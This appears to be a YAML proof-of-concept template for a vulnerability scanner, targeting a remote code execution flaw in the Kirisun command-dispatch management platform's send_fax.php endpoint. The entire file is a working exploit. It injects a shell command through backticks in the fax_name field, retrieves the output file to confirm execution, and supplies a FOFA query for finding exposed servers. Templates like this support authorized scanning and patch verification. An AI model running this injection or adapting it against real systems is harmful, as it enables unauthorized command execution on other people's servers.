id: poc-yaml-kirisun-send-fax-rce
info:
  name: 福建科立讯通信 指挥调度管理平台 send_fax 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  finger: 科立讯指挥调度管理平台
  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
variables:
  t1: random_str(4)
requests:
- method: POST
  path: /api/client/fax/send_fax.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: fax_name=`id > {{.t1}}.txt`.pdf
  expression: status_code == 200 && contains(body,"pdfupload file error Fax image
    not available on server")
- method: GET
  path: /api/client/fax/{{.t1}}.txt
  expression: status_code == 200 && contains(body,"uid=") && contains(body,"gid=")
    && !contains(body,"<")
transport: http
